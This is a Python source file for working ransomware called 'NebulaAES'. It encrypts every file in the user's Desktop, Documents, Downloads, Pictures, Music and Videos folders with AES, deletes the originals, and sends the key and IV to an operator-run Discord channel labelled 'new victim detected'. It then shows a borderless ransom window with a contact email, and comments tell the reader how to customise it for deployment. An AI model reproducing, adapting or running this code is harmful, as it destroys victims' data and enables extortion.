import os
import uuid
import threading
import tempfile
import asyncio
import discord
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
from secrets import token_bytes
import tkinter as tk
from tkinter import messagebox

# === SETTINGS ===
DISCORD_TOKEN = "YOUR_DISCORD_TOKEN_HERE"
DISCORD_GUILD_ID = YOUR_DISCORD_SERVER_ID
PARENT_CHANNEL_ID = YOUR_DISCORD_CHANNEL_ID
PASSWORD = "NebulaAES" # if you gonna change here change bots output
EXT = ".NEBULA" #extension
WIDTH = 900 #width and height u can make these 1920x1080 u might need to change text size
HEIGHT = 700

TARGET_FOLDERS = [ # you change here add or delete paths
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Pictures"),
    os.path.expanduser("~/Music"),
    os.path.expanduser("~/Videos"),
]

# === AES ===
AES_KEY = token_bytes(16) #random generating
AES_IV = token_bytes(16) #random generating
MACHINE_ID = str(uuid.uuid4())[:8]
KEY_FILE = os.path.join(tempfile.gettempdir(), f"{MACHINE_ID}.txt")


def save_keys_to_temp(): 
    try:
        with open(KEY_FILE, "w") as f:
            f.write(f"Password: {PASSWORD}\n")
            f.write(f"AES Key: {b64encode(AES_KEY).decode()}\n")
            f.write(f"AES IV: {b64encode(AES_IV).decode()}\n")
    except Exception as e:
        print(f"[!] write errorı: {e}")

def delete_key_file():
    try:
        if os.path.exists(KEY_FILE):
            os.remove(KEY_FILE)
            print(f"[+] temp deleted: {KEY_FILE}")
    except Exception as e:
        print(f"[!] temp delete error: {e}")

save_keys_to_temp()

# === Discord BOT ===
intents = discord.Intents.default()
client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f"[+] Bot : {client.user}")
    try:
        guild = await client.fetch_guild(DISCORD_GUILD_ID)
        parent_channel = await guild.fetch_channel(PARENT_CHANNEL_ID)
        category = parent_channel.category if hasattr(parent_channel, 'category') else None

        channel = await guild.create_text_channel(name=f"key-{MACHINE_ID}", category=category)

        await channel.send(f"🧨 new victim detected: `{MACHINE_ID}`")
        await channel.send(f"**AES Key:** `{b64encode(AES_KEY).decode()}`\n**IV:** `{b64encode(AES_IV).decode()}`\n**Password:** `{PASSWORD}`")

        delete_key_file()

    except Exception as e:
        print(f"[!] discord error: {e}")

async def start_discord_bot():
    while True:
        try:
            print("[*] connecting...")
            await client.start(DISCORD_TOKEN)
        except Exception as e:
            print(f"[!] discord connect error {e}")
            await asyncio.sleep(10)

# === encryption ===
def encrypt_file(path):
    try:
        with open(path, "rb") as f:
            data = f.read()
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        encrypted = cipher.encrypt(pad(data, AES.block_size))
        with open(path + EXT, "wb") as f:
            f.write(encrypted)
        os.remove(path)
        print(f"[+] : {path}")
    except Exception as e:
        print(f"[!] encryption error: {e}")

def encrypt_all():
    for folder in TARGET_FOLDERS:
        for root, dirs, files in os.walk(folder):
            for file in files:
                if not file.endswith(EXT):
                    encrypt_file(os.path.join(root, file))

# === Decryption ===
def decrypt_file_custom(path, key, iv):
    try:
        with open(path, "rb") as f:
            data = f.read()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(data), AES.block_size)
        with open(path[:-len(EXT)], "wb") as f:
            f.write(decrypted)
        os.remove(path)
        print(f"[+] Decrypted: {path}")
    except Exception as e:
        print(f"[!] decryption error: {e}")

def decrypt_all_custom(key, iv):
    for folder in TARGET_FOLDERS:
        for root, dirs, files in os.walk(folder):
            for file in files:
                if file.endswith(EXT):
                    decrypt_file_custom(os.path.join(root, file), key, iv)

# === GUI ===
class RansomGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("NebulaAES") # title could be changed
        self.root.configure(bg="#0f0f17")
        self.root.resizable(False, False)
        self.root.overrideredirect(True)

        x = (root.winfo_screenwidth() // 2) - (WIDTH // 2)
        y = (root.winfo_screenheight() // 2) - (HEIGHT // 2)
        root.geometry(f"{WIDTH}x{HEIGHT}+{x}+{y}")

        tk.Label(root, text="☠️  YOUR FILES HAVE BEEN ENCRYPTED  ☠️", fg="#b366ff", bg="#0f0f17", font=("Consolas", 24, "bold")).pack(pady=(20,10))

        info = f"""Your files were encrypted using AES-128-CBC. 
Code: {MACHINE_ID}

To recover, enter Password, AES Key and IV.

Contact: YOUR_GMAIL@gmail.com""" # the ransom note u can change this also
        tk.Label(root, text=info, fg="white", bg="#0f0f17", font=("Courier New", 14), justify="center").pack(pady=(0, 20))

        self._add_field("AES Key (Base64):", "key")
        self._add_field("AES IV (Base64):", "iv")
        self._add_field("Decryption Password:", "pw", is_password=True)

        self.decrypt_btn = tk.Button(root, text="Decrypt Files", command=self.try_decrypt,
                                    font=("Arial", 16), fg="white", bg="#6600cc",
                                    activebackground="#330066", activeforeground="white",
                                    relief="flat", bd=0, highlightthickness=2, highlightbackground="#b366ff",
                                    width=20, height=2)
        self.decrypt_btn.pack(pady=30)

    def _add_field(self, label_text, attr_name, is_password=False):
        label = tk.Label(self.root, text=label_text, fg="#b366ff", bg="#0f0f17", font=("Arial", 12, "bold"))
        label.pack()
        entry = tk.Entry(self.root, font=("Arial", 14), fg="white", bg="#2a1a47",
                         insertbackground="white", highlightthickness=2,
                         highlightbackground="#b366ff", show="*" if is_password else "")
        entry.pack(pady=(0, 10), ipadx=10, ipady=4)
        setattr(self, f"{attr_name}_entry", entry)

    def try_decrypt(self):
        try:
            pw = self.pw_entry.get()
            key = b64decode(self.key_entry.get())
            iv = b64decode(self.iv_entry.get())
        except:
            messagebox.showerror("Error", "Invalid Base64!")
            return

        if pw != PASSWORD:
            messagebox.showerror("Error", "Incorrect password!")
            return

        if len(key) != 16 or len(iv) != 16:
            messagebox.showerror("Error", "Key and IV must be 16 bytes.")
            return

        threading.Thread(target=self.do_decrypt, args=(key, iv)).start()

    def do_decrypt(self, key, iv):
        decrypt_all_custom(key, iv)
        delete_key_file()
        self.root.destroy()

# === MAIN ===
def main():
    threading.Thread(target=encrypt_all).start()

    def run_discord():
        asyncio.run(start_discord_bot())

    threading.Thread(target=run_discord, daemon=True).start()

    root = tk.Tk()
    app = RansomGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
